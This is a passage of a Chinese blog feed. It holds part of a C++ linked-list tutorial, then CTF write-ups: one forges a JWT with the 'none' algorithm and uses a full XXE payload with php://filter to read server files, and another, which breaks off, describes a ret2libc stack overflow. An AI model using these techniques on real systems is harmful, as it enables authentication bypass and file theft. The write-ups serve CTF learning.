class="keyword">new</span> <span class="keyword">int</span>;</span><br><span class="line">*p=<span class="number">5</span>;<span class="comment">//这样我们才能去使用它</span></span><br></pre></td></tr></table></figure></div><h3 id="关键字delete"><a href="#关键字delete" class="headerlink" title="关键字delete"></a>关键字delete</h3><p><strong>delete是c++对free关键字对再封装。</strong>delete后面加上地址，这块地址就会被清除掉。再访问这个地址就是非法的。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">p=<span class="keyword">new</span> <span class="keyword">int</span>;</span><br><span class="line"><span class="keyword">delete</span> p;<span class="comment">//这样p的空间就被删掉了</span></span><br></pre></td></tr></table></figure></div><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/%E6%88%AA%E5%B1%8F%202020-05-23%20%E4%B8%8A%E5%8D%8812.27.16.png" data-fancybox="group" data-caption="new和delete" class="fancybox"><img alt="new和delete" title="new和delete" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%80/%E6%88%AA%E5%B1%8F%202020-05-23%20%E4%B8%8A%E5%8D%8812.27.16.png" class="lazyload"></a></p><h2 id="动态的使用链表"><a href="#动态的使用链表" class="headerlink" title="动态的使用链表"></a>动态的使用链表</h2><p>即使您以静态的方式构造了链表，也仍然可以按动态的方式去使用它。</p><h3 id="动态的创建一个链表"><a href="#动态的创建一个链表" class="headerlink" title="动态的创建一个链表"></a>动态的创建一个链表</h3><p>使用new来创造新节点并连接到链表上。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">box FirstBox;</span><br><span class="line">FirstBox-&gt;next=<span class="keyword">new</span> box;<span class="comment">//这样就可以了</span></span><br></pre></td></tr></table></figure></div><p>现在我们来写一个函数，作用是动态生成一个指定长度的链表。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBoxes</span><span class="params">(box &amp;FirstBox,<span class="keyword">int</span> Num)</span></span>&#123;<span class="comment">//因为我们会对FirstBox内的值做出修改，所以要按引用传递它。Num则代表了在FirstBox后面接上多少个box。</span></span><br><span class="line">box *p= &amp;FirstBox;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Num;i++)&#123;</span><br><span class="line">  p-&gt;next=<span class="keyword">new</span> box;</span><br><span class="line">  p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><em>\</em>如果您看过其他的数据结构教程，通常还会提出头插法和尾插法的概念，上述代码演示的是尾插法。头插法将在【有关链表的额外内容】中介绍。*</p><p>以上代码并不复杂，但是如果您的c语言基础不够坚实，可能会对*和&amp;的使用感到混乱。</p><p>我们来梳理一遍</p><h3 id="梳理-amp-和"><a href="#梳理-amp-和" class="headerlink" title="梳理&amp;和*"></a>梳理&amp;和*</h3><p>&amp;和<em>是成对的，它们俩都重载了三种类型的运算符（一个运算符具有不同作用的情况我们叫做运算符的重载）分别是 *</em>指针操作符<strong>，</strong>变量修饰符<strong>，</strong>算术运算符**</p><p>&amp;对应的三种运算符分别是：<strong>取地址运算符</strong>，<strong>引用</strong>，<strong><em>按位与运算符</em></strong>。</p><p><em>对应的三种运算符分别是：*</em>解引用运算符<strong>，</strong>指针<strong>，*</strong>乘运算符***。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> *p;<span class="comment">//在这里*是int的修饰符</span></span><br><span class="line">p=&amp;a;<span class="comment">//&amp;是取地址运算符，当这条语句执行时，发生了两个操作，先获取了a变量的地址，然后赋值给整数指针p</span></span><br><span class="line">*p=<span class="number">5</span>;<span class="comment">//在这里*是解引用运算符，意为到达p中储存的地址对应的储存空间</span></span><br></pre></td></tr></table></figure></div><p><em>通常一般的教程会把在声明变量时用到的&amp;和*与函数传参时的&amp;和*分开讨论，仿佛&amp;和*还有第四类含义。实际上我认为这两种情况&amp;和*都是它们的修饰符用法。</em></p><p>先解释一下修饰符</p><p><code>int a=0;</code></p><p>这是我们再熟悉不过的语句，声明了一个整型变量a。但是我们在声明时还可以加上修饰符*来修饰变量</p><p><code>int *a;</code></p><p>就是把a修饰成了一个指针。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> &amp;b=a;</span><br></pre></td></tr></table></figure></div><p>这时的b被修饰成了一个别名，把另外一个变量赋值给它，b就和a完全一样了。让一个变量引用另一个变量，就是把一个变量作为另一个变量的别名。</p><p>⚠️<strong>注意</strong>：当&amp;和*作为修饰符时，修饰的是变量，而不是数据类型的修符(const,short,long …)。</p><p>所以你的声明语句可以这样写</p><p><code>int a,*b=&amp;a,&amp;c=a;</code></p><p>现在我们来看看函数传参的情况</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">example</span><span class="params">(<span class="keyword">int</span> *x,<span class="keyword">int</span> &amp;y,<span class="keyword">int</span> z，<span class="keyword">int</span> *&amp;w)</span></span>&#123;<span class="comment">//圆括号里的内容叫做参数列表</span></span><br><span class="line">*x=<span class="number">5</span>;</span><br><span class="line">  y=<span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>参数列表就是在<strong>定义变量</strong>，这些变量也是函数的<strong>局部变量</strong>，只不过它们需要在调用函数时被赋值。这些特殊的变量叫做<strong>形参</strong>，就像勾股定理里的abc一样，当调用函数时，赋值给他们的变量叫做<strong>实参</strong>，相当于你在用勾股定理时放进去的3,4,5。给这些特殊的局部变量赋值的过程，叫做<strong>传参</strong>。</p><p>因为参数列表就是在定义变量，所以&amp;和<em>的意义其实和声明变量时的一样，所以x就是指针，y就是实参的别名。*</em>由于y是别名，所以在函数内对y的值的修改，会作用到实参上。<strong>相对的，</strong>z在函数内的变化不会作用到实参上。**</p><p>y的传参方式叫做<strong>按引用传参</strong>。w是按引用传递了一个整型指针变量。</p><p>终于我们梳理完了&amp;和*易迷惑的用法。现在您可以来试试能否理解下面这条语句。</p><p><code>int _,*&amp;__=&amp;_;</code></p><p>如果您已经可以理解了，那么就可以继续了。</p><h3 id="动态的插入"><a href="#动态的插入" class="headerlink" title="动态的插入"></a>动态的插入</h3><p>同样，我们来写一个实用的函数。思考一下，要在一个链表中增加一个结点，你会怎么去设计这个函数呢？</p><p>我的设计是，传递进来两个参数，一个是链表的开头，另一个是整型，意义是把新结点插入到第几号位。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(box &amp;FirstBox,<span class="keyword">int</span> location)</span></span>&#123;</span><br><span class="line">  box*p=&amp;FirstBox,*pNewBox=<span class="keyword">new</span> box;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;location;i++)&#123;</span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  pNewBox-&gt;next=p-&gt;next;</span><br><span class="line">  p-&gt;next=pNewBox;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><em>忘记怎么插入了？去问问小橙和小红吧！</em>上述代码您应该已经可以自己轻松写出才对。</p><p>需要帮助吗？这里有注释版。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(box &amp;FirstBox,<span class="keyword">int</span> location)</span></span>&#123;<span class="comment">//FirstBox是按引用传递进来的box对象。</span></span><br><span class="line">  box*p=&amp;FirstBox,*pNewBox=<span class="keyword">new</span> box;<span class="comment">//p是一个指针，储存了FirstBox的地址，pNewBox也是一个指针，储存了动态申请的一块box类型储存空间（就是小红）。</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;location;i++)&#123;</span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">  &#125;<span class="comment">//这个循环是在从开头向后走，循环结束时的p就是之前例子中的小橙</span></span><br><span class="line">  pNewBox-&gt;next=p-&gt;next;</span><br><span class="line">  p-&gt;next=pNewBox;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h3><p>我们前面讲到的<strong>delete</strong>关键字现在终于用到了。</p><p>顺序表在物理储存空间上彼此相邻，我们就不能删除掉某一块储存空间。但是链表仅在逻辑上彼此相邻，因此物理空间是可以删去的，只要删除掉一个结点后，仍然能保证链表的连续性就好。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">box List,*p=&amp;List;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">  p-&gt;next=<span class="keyword">new</span> box;</span><br><span class="line">  p=p-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>我们先创建一个链表，接着来写一个删除指定结点的函数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNode</span><span class="params">(box &amp;FirstBox,<span class="keyword">int</span> location)</span></span>&#123;</span><br><span class="line">  box *p=&amp;FirstBox,*target;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;location;i++)&#123;</span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  target=p-&gt;next;<span class="comment">//p的下一个就是我们的目标，要被删除掉的地址。</span></span><br><span class="line">  p-&gt;next=target-&gt;next;<span class="comment">//目标的下一个地址需要给目标的前一个来保证连续性。</span></span><br><span class="line">  <span class="keyword">delete</span> target;<span class="comment">//保证连续性后就可以直接把目标删掉了。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>代码逻辑也很简单，如果感到迷惑不妨从上到下一句一句去想一想。</p><p>到这里我们就讲完了链表的所有基本操作。</p><h1 id="关于链表的额外内容"><a href="#关于链表的额外内容" class="headerlink" title="关于链表的额外内容"></a>关于链表的额外内容</h1><h2 id="其他类型的链表"><a href="#其他类型的链表" class="headerlink" title="其他类型的链表"></a>其他类型的链表</h2><p>在学校的实验课程里还能见到更多样化的链表，例如双向链表，环形单链表，环形双链表等等。这些名字毫无意义，所谓双向链表（双链表）就是在我们的box里增加一个指针，指向前一个。环形单链表就是最后一个结点的指针指向头结点，环形双链表就不必多说了吧。</p><p>如果你让两个链表互相交错你还可以叫它DNA链表，或者看下面这段代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> data;</span><br><span class="line">  <span class="keyword">static</span> MaxNum1=<span class="number">100</span>,MaxNum2=<span class="number">100</span>,MaxNum3=<span class="number">100</span>;</span><br><span class="line">  Node* connection1=<span class="literal">NULL</span>;</span><br><span class="line">  Node* connection2=<span class="literal">NULL</span>;</span><br><span class="line">  Node* connection3=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Spread</span><span class="params">(Node* Head)</span></span>&#123;</span><br><span class="line">  Head-&gt;connection1=<span class="keyword">new</span> Node;</span><br><span class="line">  Head-&gt;MaxNum1-=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(Head-&gt;MaxNum1&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    Spread(Head-&gt;connection1);</span><br><span class="line">  &#125;</span><br><span class="line"> Head-&gt;connection2=<span class="keyword">new</span> Node;</span><br><span class="line">  Head-&gt;MaxNum2-=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(Head-&gt;MaxNum2&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    Spread(Head-&gt;connection2);</span><br><span class="line">  &#125;</span><br><span class="line">  Head-&gt;connection3=<span class="keyword">new</span> Node;</span><br><span class="line">  Head-&gt;MaxNum3-=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>(Head-&gt;MaxNum3&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    Spread(Head-&gt;connection3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  Node a,*p=&amp;a;</span><br><span class="line">  Spread(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>执行后就会创造一个超展开链表，从一个点延伸到901个结点。所以，，链表就是链表，给链表继续分类是没有意义的，在一个链表中增加更多的指针，让它的链表结构更复杂也都是为程序服务的。换句话说，<strong>链表的结构是需要根据程序来设计的</strong>。</p><h2 id="合并链表"><a href="#合并链表" class="headerlink" title="合并链表"></a>合并链表</h2><p>学校的实验居然单列了一个合并链表，基于我们上面学习到的东西，无论是把两个表前后接在一起还是把两个表穿插合并我们都能轻松解决。</p><p><em>（前后接就是把一个表的头结点接到另一个表的结尾，穿插合并就是把一个表的所有结点插入到另一个表中。）</em></p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>同样的，排序也是使用我们上面讲过的基本操作来实现的复杂操作。</p><p>1.<strong>遍历链表</strong>把数据储存到数组，对数组中的数据进行排序。</p><p>2.遍历排好序的数组移动结点。</p><p>​    怎么移动呢，移动就是把这个结点从链表上取下，也就是把目标的下一个地址给上一个。再<strong>插入</strong>到正确的位置。</p><p>都是我们前面研究过的基本操作，组合起来稍加调整即可实现。如果您的编程基础不够扎实，可能需要花费更长的时间。</p><p><em>（链表的排序为什么出现了数组呢？把数据放进数组处理是为了避免谈及排序算法，这样您之前掌握的排序算法可以直接应用以降低实现难度。）</em></p><h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><p>Congratulation! 如果您完全理解了本章的所有讲解及示例代码，那么线性表就成为了您有力的工具之一了。</p><p>这是您的奖励：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> password[]=<span class="string">"flag&#123;Y0u_G0t_Linear_List&#125;"</span>;</span><br></pre></td></tr></table></figure></div><p>如果本文有帮到您，不妨在评论区留个言吧～ //最好带个昵称：）</p><p>⚠️全文除明显标注的文本外，均为本文作者所著，无参考资料。</p>]]></content>
    
    <summary type="html">
    
      虽然只是简单的线性表，来看看你和我理解的一样吗？
    
    </summary>
    
    
    
      <category term="数据结构" scheme="https://cdn.n0p3.cn/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="开发" scheme="https://cdn.n0p3.cn/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2020</title>
    <link href="https://cdn.n0p3.cn/2020/05/01/ISCC2020/"/>
    <id>https://cdn.n0p3.cn/2020/05/01/ISCC2020/</id>
    <published>2020-05-01T09:25:16.000Z</published>
    <updated>2020-07-11T11:11:26.463Z</updated>
    
    <content type="html"><![CDATA[<h1 id="未知的风险-1"><a href="#未知的风险-1" class="headerlink" title="未知的风险-1"></a>未知的风险-1</h1><p>题目有描述</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%88%AA%E5%B1%8F2020-05-01%20%E4%B8%8B%E5%8D%885.34.20.png" data-fancybox="group" data-caption="描述" class="fancybox"><img alt="描述" title="描述" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%88%AA%E5%B1%8F2020-05-01%20%E4%B8%8B%E5%8D%885.34.20.png" class="lazyload"></a></p><p>看题目，只有简单的一行</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170423.png" data-fancybox="group" data-caption="题目" class="fancybox"><img alt="题目" title="题目" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170423.png" class="lazyload"></a></p><p>hello guest，题目描述说只允许user进入，也就是我们要伪造身份。</p><p>抓包</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%88%AA%E5%B1%8F2020-05-01%20%E4%B8%8B%E5%8D%885.39.10.png" data-fancybox="group" data-caption="bp1" class="fancybox"><img alt="bp1" title="bp1" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%88%AA%E5%B1%8F2020-05-01%20%E4%B8%8B%E5%8D%885.39.10.png" class="lazyload"></a></p><p>这token格式一看就是jwt<em>（T0ki师傅说的）</em></p><p>要伪造身份，我们就要构造新的jwt，然而，虽然使用的是HS256，但是翻遍网站也找不到key。于是想到，可能服务器使用的是低版本的jwt，需要我们把加密格式改为none。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20164709.png" data-fancybox="group" data-caption="jwt_tool" class="fancybox"><img alt="jwt_tool" title="jwt_tool" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20164709.png" class="lazyload"></a></p><p>用jwt_tool来修改jwt,并发包。</p><p>成功来到一个登陆页面，对应题目描述中的一把锁。阅读页面的js代码可知，数据会以xml实体post到一个doLogin.php页面，返回的code决定了登陆是否成功。于是我尝试修改了返回包，使code为1。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/QQ%E5%9B%BE%E7%89%8720200501164622.jpg" data-fancybox="group" data-caption="login" class="fancybox"><img alt="login" title="login" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/QQ%E5%9B%BE%E7%89%8720200501164622.jpg" class="lazyload"></a></p><p>虽然登陆成功但是什么也没有。</p><p>再看题目描述，”他猜测密码格式flag{*}”,也就是说，用户密码才是flag。随即想到可能存在xxe漏洞，利用这个漏洞读取doLogin.php的源码，逆向分析验证代码获得flag。</p><p>payload：</p><p>​    <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code><br><code>&lt;!DOCTYPE N0P3 [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</code><br><code>&gt; ]&gt;</code><br><code>&lt;user&gt;</code><br>  <code>&lt;username&gt;&amp;xxe;&lt;/username&gt;</code><br>  <code>&lt;password&gt;admin&lt;/password&gt;</code><br><code>&lt;/user&gt;</code></p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20163522.png" data-fancybox="group" data-caption="xxe" class="fancybox"><img alt="xxe" title="xxe" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20163522.png" class="lazyload"></a></p><p>读取成功。分析一下源码</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170635.png" data-fancybox="group" data-caption="code" class="fancybox"><img alt="code" title="code" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170635.png" class="lazyload"></a></p><p>发现include了一个flag.php，直接利用xxe去读</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/QQ%E5%9B%BE%E7%89%8720200501164551.png" data-fancybox="group" data-caption="flag1" class="fancybox"><img alt="flag1" title="flag1" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/QQ%E5%9B%BE%E7%89%8720200501164551.png" class="lazyload"></a></p><p>读到了，解码</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170256.png" data-fancybox="group" data-caption="flag" class="fancybox"><img alt="flag" title="flag" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/ISCC2020/%E6%89%B9%E6%B3%A8%202020-05-01%20170256.png" class="lazyload"></a></p><p>连源码都不用审，直接就能get flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;未知的风险-1&quot;&gt;&lt;a href=&quot;#未知的风险-1&quot; class=&quot;headerlink&quot; title=&quot;未知的风险-1&quot;&gt;&lt;/a&gt;未知的风险-1&lt;/h1&gt;&lt;p&gt;题目有描述&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://n0p3.oss-cn-beijing.
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://cdn.n0p3.cn/tags/CTF/"/>
    
      <category term="参加的比赛" scheme="https://cdn.n0p3.cn/tags/%E5%8F%82%E5%8A%A0%E7%9A%84%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2020安恒月赛April</title>
    <link href="https://cdn.n0p3.cn/2020/04/27/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BApril/"/>
    <id>https://cdn.n0p3.cn/2020/04/27/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BApril/</id>
    <published>2020-04-27T13:44:00.000Z</published>
    <updated>2020-05-19T04:47:53.131Z</updated>
    
    <content type="html"><![CDATA[<p>这次依然是只看pwn,只看了一题，其他两题是堆，干脆就没看。</p><h1 id="echo-sever"><a href="#echo-sever" class="headerlink" title="echo sever"></a>echo sever</h1><p>连接题目，一共有两次输入，第一次输入名字的长度，第二次输入名字。</p><p>拖进ida</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8A%E5%8D%8811.29.22.png" data-fancybox="group" data-caption="main" class="fancybox"><img alt="main" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8A%E5%8D%8811.29.22.png" class="lazyload" title="main"></a></p><p>主函数没什么东西，调用了函数sub_4006d2，跟踪看一下</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.29.28.png" data-fancybox="group" data-caption="4006d2" class="fancybox"><img alt="4006d2" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.29.28.png" class="lazyload" title="4006d2"></a></p><p>输入的名字长度被传进了函数sub_4006A7,继续跟踪</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.30.12.png" data-fancybox="group" data-caption="4006A7" class="fancybox"><img alt="4006A7" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.30.12.png" class="lazyload" title="4006A7"></a></p><p>可以看到我们输入的名字长度被作为了read函数的读入字符长度，所以读入长度我们可控，只要我们输入的长度够大，就可以造成栈溢出。</p><p>但是由于函数中并没有现成的shellcode，所以这题是ret2libc。第一次遇到64位的ret2libc题目，并且用到了一个以前没有用过的工具，ROPgadget。</p><p>exp</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/2020%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%20April/%E6%88%AA%E5%B1%8F2020-04-27%20%E4%B8%8B%E5%8D%889.31.13.png" data-fancybox="group" data-caption="exp" class="fancybox"><img alt="exp" 